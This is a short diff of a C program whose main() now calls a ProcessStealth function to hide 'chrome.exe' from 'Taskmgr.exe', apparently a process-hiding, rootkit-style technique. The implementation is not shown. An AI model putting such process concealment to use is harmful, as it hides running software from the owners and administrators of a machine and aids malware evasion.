@@ -2,8 +2,8 @@
 
 int main(int argc, char *argv[])
 {
-    if (argc < 3)
-    {
-        
-    }
+    wchar_t Target[] = L"Taskmgr.exe";
+    wchar_t Hide[] = L"chrome.exe";
+    ProcessStealth(Target, Hide);
+    system("pause");
 }
